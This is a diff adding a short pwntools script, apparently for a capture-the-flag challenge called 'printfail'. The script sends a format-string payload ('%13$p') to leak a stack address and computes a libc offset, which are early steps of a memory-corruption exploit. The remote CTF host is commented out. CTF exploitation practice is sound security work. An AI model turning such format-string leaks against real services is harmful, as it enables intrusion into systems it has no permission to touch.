@@ -1,0 +1,10 @@
+from pwn import *
+libc = ELF('./libc.so.6')
+print(hex(libc.sym['__libc_start_main'] + 243))
+#io = remote('puffer.utctf.live', 4630)
+io = process('./printfail')
+#gdb.attach(io, api=True)
+io.recvuntil(b'do-overs.\n')
+io.send(b'\n%13$p')
+#print(io.recvuntil(b'chance.'))
+io.interactive()
